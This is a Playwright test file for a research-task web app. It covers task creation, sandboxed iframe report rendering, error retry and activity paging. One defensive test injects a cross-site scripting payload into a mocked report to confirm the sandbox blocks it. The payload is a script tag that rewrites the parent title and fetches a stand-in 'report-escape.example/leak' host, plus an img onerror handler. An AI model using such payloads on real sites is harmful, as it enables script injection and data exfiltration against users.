import { expect, test, type Page } from '@playwright/test';

const completed = {
  id: 'research-1', prompt: 'Compare three ways to store energy', model: 'gpt-6-sol',
  task_type: 'research', verbosity: 'standard', report_available: true, repository: 'research',
  status: 'success', workflow_id: 'research-1', created_at: '2026-10-13T12:00:00Z',
  updated_at: '2026-10-13T12:01:00Z', completed_at: '2026-10-13T12:01:00Z',
  changed_paths: [], self_update_scheduled: false,
};
const fragment = `<article><h1>Energy storage</h1><p class="lead">Match the storage method to the timescale.</p><a href="#sources">Jump to sources</a>
  <figure><svg viewBox="0 0 400 120" role="img" aria-label="Storage comparison"><rect x="10" y="20" width="180" height="32" fill="#7b4dff"/><text x="10" y="90">Batteries</text></svg><figcaption>Illustrative comparison, not measured data.</figcaption></figure>
  <div class="table-wrap"><table><thead><tr><th>Method</th><th>Use</th></tr></thead><tbody><tr><td>Batteries</td><td>Daily balancing</td></tr></tbody></table></div>
  <h2 id="sources">Sources</h2><ol class="source-list"><li><a href="https://example.org/evidence" target="_blank" rel="noopener noreferrer">Source evidence</a></li></ol>
  <svg viewBox="0 0 40 40" width="40" fill="none" aria-label="Outline example"><circle cx="20" cy="20" r="16" stroke="currentColor"/></svg></article>`;

async function setup(page: Page, scheme = 'dark') {
  await page.addInitScript((theme) => {
    localStorage.setItem('@jarvis_app/refreshToken', 'test-only');
    localStorage.setItem('@jarvis_app/theme', theme);
    window.__RUNTIME_EXPO_PUBLIC__ = { EXPO_PUBLIC_API_URL: location.origin };
  }, scheme);
  const token = `e30.${Buffer.from(JSON.stringify({ exp: 4102444800 })).toString('base64url')}.test`;
  const submitted: Record<string, unknown>[] = [];
  const tasks = [completed];
  await page.route('**/v1/**', async (route) => {
    const request = route.request();
    const path = new URL(request.url()).pathname;
    if (path === '/v1/auth/refresh') return route.fulfill({ json: { access_token: token, refresh_token: 'test-only' } });
    if (path === '/v1/users/me') return route.fulfill({ json: { id: 'test', email: 'research@example.test', name: 'Research test', settings: {} } });
    if (path === '/v1/research-tasks' && request.method() === 'POST') {
      const body = request.postDataJSON();
      submitted.push(body);
      const task = { ...completed, ...body, id: 'research-new', status: 'queued', report_available: false };
      tasks.unshift(task);
      return route.fulfill({ status: 202, json: task });
    }
    if (path === '/v1/research-tasks') return route.fulfill({ json: { items: tasks, next_cursor: null } });
    if (path === '/v1/research-tasks/research-1/report') return route.fulfill({ json: { task_id: completed.id, html: fragment } });
    if (path.endsWith('/output')) return route.fulfill({ json: {
      items: [], next_after: 0, has_more: false, truncated: false,
      task: tasks.find(task => path.includes(`/${task.id}/`)) ?? completed,
    } });
    if (path.startsWith('/v1/research-tasks/')) return route.fulfill({ json: tasks.find(task => path.endsWith(task.id)) ?? completed });
    return route.fulfill({ json: [] });
  });
  return submitted;
}

async function openResearch(page: Page) {
  await page.goto('/');
  if (page.viewportSize()!.width < 1180) {
    await page.getByRole('button', { name: 'Open menu' }).click({ timeout: 15000 });
  }
  await page.getByText('Research', { exact: true }).click();
  await expect(page.getByText(completed.prompt, { exact: true })).toBeVisible();
}

test('creates research with explicit model and detail level', async ({ page }, testInfo) => {
  const submitted = await setup(page);
  await openResearch(page);
  await page.getByRole('button', { name: 'New task', exact: true }).click();
  await expect(page.getByRole('radio', { name: 'Sol', exact: true })).toHaveAttribute('aria-checked', 'true');
  await page.getByRole('radio', { name: 'Terra', exact: true }).click();
  await page.getByRole('radio', { name: 'Concise', exact: true }).click();
  await page.getByRole('textbox').fill('List every item in the requested scope, with names only.');
  const submit = page.getByRole('button', { name: 'Create task', exact: true });
  await expect(submit).toBeInViewport();
  await page.screenshot({ path: testInfo.outputPath('new-research-task.png'), animations: 'disabled' });
  await submit.click();
  await expect.poll(() => submitted.length).toBe(1);
  expect(submitted[0]).toEqual({ prompt: 'List every item in the requested scope, with names only.', model: 'gpt-5.6-terra', verbosity: 'concise' });
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
});

for (const scheme of ['light', 'dark']) {
  test(`opens a themed report with diagrams and sources in ${scheme} mode`, async ({ page }, testInfo) => {
    await setup(page, scheme);
    await openResearch(page);
    await page.getByRole('button', { name: 'Open report', exact: true }).click();
    const frame = page.frameLocator('iframe');
    await expect(frame.getByRole('heading', { name: 'Energy storage' })).toBeVisible();
    await expect(frame.getByRole('img', { name: 'Storage comparison' })).toBeVisible();
    await expect(frame.getByRole('cell', { name: 'Daily balancing' })).toBeVisible();
    await expect(frame.getByRole('link', { name: 'Source evidence' })).toHaveAttribute('target', '_blank');
    const sandbox = await page.locator('iframe').getAttribute('sandbox');
    expect(sandbox).not.toContain('allow-scripts');
    expect(sandbox).not.toContain('allow-same-origin');
    expect(await frame.locator('body').evaluate(el => getComputedStyle(el).color)).toBe(scheme === 'dark' ? 'rgb(241, 237, 247)' : 'rgb(26, 20, 38)');
    expect(await frame.locator('svg text').evaluate(el => getComputedStyle(el).fill)).toBe(scheme === 'dark' ? 'rgb(241, 237, 247)' : 'rgb(26, 20, 38)');
    expect(await frame.locator('svg rect').evaluate(el => getComputedStyle(el).fill)).toBe('rgb(123, 77, 255)');
    expect(await frame.locator('svg[fill="none"] circle').evaluate(el => getComputedStyle(el).fill)).toBe('none');
    expect(await frame.locator('html').evaluate(el => el.scrollWidth <= window.innerWidth)).toBe(true);
    await expect(page.getByRole('button', { name: 'Close report', exact: true })).toBeInViewport();
    await page.screenshot({ path: testInfo.outputPath(`report-${scheme}.png`), animations: 'disabled' });
    await frame.getByRole('link', { name: 'Jump to sources' }).click();
    await expect(frame.getByRole('heading', { name: 'Sources', exact: true })).toBeVisible();
    expect(await frame.locator('html').evaluate(() => location.href)).toBe('about:srcdoc#sources');
    await page.getByRole('button', { name: 'Close report', exact: true }).click();
    await expect(page.locator('iframe')).toHaveCount(0);
  });
}

test('a closed report stays closed when its response arrives late', async ({ page }) => {
  await setup(page);
  let release!: () => void;
  const pending = new Promise<void>(resolve => { release = resolve; });
  await page.route('**/v1/research-tasks/research-1/report', async route => {
    await pending;
    await route.fulfill({ json: { task_id: completed.id, html: fragment } });
  });
  await openResearch(page);
  const started = page.waitForRequest('**/v1/research-tasks/research-1/report');
  await page.getByRole('button', { name: 'Open report', exact: true }).click();
  await started;
  await page.getByRole('button', { name: 'Close report', exact: true }).click();
  const response = page.waitForResponse('**/v1/research-tasks/research-1/report');
  release();
  await response;
  await page.evaluate(() => new Promise(requestAnimationFrame));
  await expect(page.locator('iframe')).toHaveCount(0);
});

test('report fetch errors remain in the modal and can be retried', async ({ page }) => {
  await setup(page);
  await page.route('**/v1/research-tasks/research-1/report', route => route.fulfill({ status: 503, json: { detail: 'Report storage unavailable' } }));
  await openResearch(page);
  await page.getByRole('button', { name: 'Open report', exact: true }).click();
  await expect(page.locator('iframe')).toHaveCount(0);
  await expect(page.getByText('Report storage unavailable')).toBeVisible();
  await page.unroute('**/v1/research-tasks/research-1/report');
  await page.getByRole('button', { name: 'Retry report', exact: true }).click();
  await expect(page.frameLocator('iframe').getByRole('heading', { name: 'Energy storage' })).toBeVisible();
});

test('drains activity pages and exposes the finished report without reopening the task', async ({ page }) => {
  await setup(page);
  const running = { ...completed, status: 'running', completed_at: null, report_available: false };
  await page.route('**/v1/research-tasks?*', route => route.fulfill({ json: { items: [running], next_cursor: null } }));
  const cursors: string[] = [];
  await page.route('**/v1/research-tasks/research-1/output?*', route => {
    const after = new URL(route.request().url()).searchParams.get('after') ?? '0';
    cursors.push(after);
    const first = after === '0';
    return route.fulfill({ json: {
      items: [{ seq: first ? 1 : 2, kind: 'assistant', text: first ? 'Comparing primary sources' : 'Report saved and checked', created_at: completed.updated_at }],
      next_after: first ? 1 : 2, has_more: first, truncated: false,
      task: { ...(first ? running : completed), output_seq: first ? 1 : 2 },
    } });
  });
  await openResearch(page);
  await expect(page.getByRole('button', { name: 'Open report', exact: true })).toHaveCount(0);
  await page.getByText(completed.prompt, { exact: true }).click();
  await expect(page.getByText('Comparing primary sources', { exact: true })).toBeVisible();
  await expect(page.getByText('Report saved and checked', { exact: true })).toBeVisible();
  await expect(page.getByText('Up to date', { exact: true })).toBeVisible();
  expect(cursors).toEqual(['0', '1']);
  await page.getByRole('button', { name: 'Open report', exact: true }).filter({ hasText: 'Open report' }).click();
  await expect(page.frameLocator('iframe').getByRole('heading', { name: 'Energy storage' })).toBeVisible();
});

test('the report sandbox blocks scripts even if an unsafe response reaches it', async ({ page }) => {
  await setup(page);
  const forbidden: string[] = [];
  const blocked: string[] = [];
  const responses: string[] = [];
  page.on('request', request => {
    if (request.url().includes('report-escape.example')) forbidden.push(request.url());
  });
  page.on('requestfailed', request => {
    if (request.url().includes('report-escape.example') && request.failure()?.errorText === 'csp') blocked.push(request.url());
  });
  page.on('response', response => {
    if (response.url().includes('report-escape.example')) responses.push(response.url());
  });
  await page.route('**/v1/research-tasks/research-1/report', route => route.fulfill({ json: {
    task_id: completed.id,
    html: fragment + '<script>parent.document.title="COMPROMISED";fetch("https://report-escape.example/leak")</script><img src="https://report-escape.example/image" onerror="parent.document.title=\'COMPROMISED\'">',
  } }));
  await openResearch(page);
  await page.getByRole('button', { name: 'Open report', exact: true }).click();
  await expect(page.frameLocator('iframe').getByRole('heading', { name: 'Energy storage' })).toBeVisible();
  expect(await page.title()).not.toBe('COMPROMISED');
  // Playwright emits a request event even for a resource rejected before network access.
  await expect.poll(() => blocked).toEqual(['https://report-escape.example/image']);
  expect(forbidden).toEqual(blocked);
  expect(responses).toEqual([]);
});
